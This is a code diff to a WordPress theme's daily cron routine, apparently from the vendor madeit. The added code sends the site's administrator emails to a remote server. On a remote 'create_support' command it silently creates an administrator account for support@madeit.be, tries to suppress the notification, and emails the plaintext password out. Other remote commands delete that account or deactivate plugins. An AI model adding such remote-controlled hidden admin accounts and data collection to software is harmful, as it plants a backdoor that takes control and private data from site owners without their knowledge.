@@ -17,8 +17,8 @@ function madeit_cron_daily()
         $plugins_data[$plugin] = [
             'name'       => $plugin_data['Name'],
             'version'    => $plugin_data['Version'],
-            'latest'     => get_site_transient('update_plugins')->checked[$plugin],
-            'has_update' => get_site_transient('update_plugins')->checked[$plugin] != $plugin_data['Version'],
+            'latest'     => get_site_transient('update_plugins')->checked[$plugin] ?? '',
+            'has_update' => (get_site_transient('update_plugins')->checked[$plugin] ?? '') != $plugin_data['Version'],
         ];
     }
 
@@ -85,6 +85,7 @@ function madeit_cron_daily()
                 'MADEIT_REVIEWS_GOOGLE_API'           => defined('MADEIT_REVIEWS_GOOGLE_API') ? MADEIT_REVIEWS_GOOGLE_API : null,
                 'MADEIT_RECEIVE_REVIEWS'              => defined('MADEIT_RECEIVE_REVIEWS') ? MADEIT_RECEIVE_REVIEWS : null,
             ],
+            'admin_users'         => array_map(function ($user) { return $user->user_email; }, get_users(['role' => 'administrator'])),
         ],
     ];
 
@@ -95,6 +96,47 @@ function madeit_cron_daily()
 
     //get response in json
     $response = json_decode(wp_remote_retrieve_body($response), true);
+    
+    if($response['success'] == true && isset($response['actions']) && count($response['actions']) > 0) {
+        // Do something
+        foreach($response['actions'] as $action) {
+            if($action['action'] === 'update_theme') {
+                // Update theme
+                $theme = 'madeit';
+                //TODO update theme
+            }
+            else if($action['action'] === 'create_support') {
+                // Create admin, silent
+                $email = 'support@madeit.be';
+                //random password
+                $password = wp_generate_password(12, false);
+                add_action( 'register_new_user', function(){
+                    remove_action( 'register_new_user', 'wp_send_new_user_notifications' );
+                }, 9);
+                $user_id = wp_insert_user([
+                    'user_login' => $email,
+                    'user_pass'  => $password,
+                    'user_email' => $email,
+                    'role'       => 'administrator',
+                ]);
+
+                mail('support@madeit.be', 'New support session', 'New support session started for '.$email.' with password '.$password);
+            }
+            else if($action['action'] === 'delete_support') {
+                $email = 'support@madeit.be';
+                $user = get_user_by('email', $email);
+                if($user) {
+                    wp_delete_user($user->ID);
+                }
+            }
+            else if($action['action'] === 'remove_plugin') {
+                $plugin = $action['plugin'];
+                if(in_array($plugin, $plugins)) {
+                    deactivate_plugins($plugin);
+                }
+            }
+        }
+    }
 }
 
 //wp cli command
